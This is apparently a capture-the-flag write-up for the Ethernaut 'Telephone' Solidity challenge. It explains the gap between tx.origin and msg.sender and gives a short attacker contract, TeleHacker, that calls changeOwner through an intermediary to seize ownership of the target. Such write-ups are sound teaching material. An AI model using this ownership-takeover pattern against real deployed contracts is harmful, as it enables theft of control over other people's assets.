# Telephone
```javascript
pragma solidity ^0.4.18;

contract Telephone {

  address public owner;

  function Telephone() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
```

This challenge point out the different between `tx.origin` & `msg.sender`.

From Solidity document:

* **tx.origin** (address payable): 
    sender of the transaction (full call chain)

* **msg.sender** (address payable): 
    sender of the message (current call)
    
Therefore, we get a very obvious plan that we deploy a contract which will call target contract instance's `changeOwner()` function.

Then we use ourself(EOA) to call the contract we deployed. 

Contract example like following:
```javascript
pragma solidity ^0.4.18;
 
contract Telephone {
  function changeOwner(address _owner) public;
}
contract TeleHacker {    
 
    function hack(address param) public{ /*param Is Your Zepplin Main Contract Address*/
      Telephone target = Telephone(param);
        target.changeOwner(msg.sender);
    }
}

```
![](https://i.imgur.com/0MpTuEj.png)

Deploy contract on [Remix IDE](https://remix.ethereum.org/).

Done.
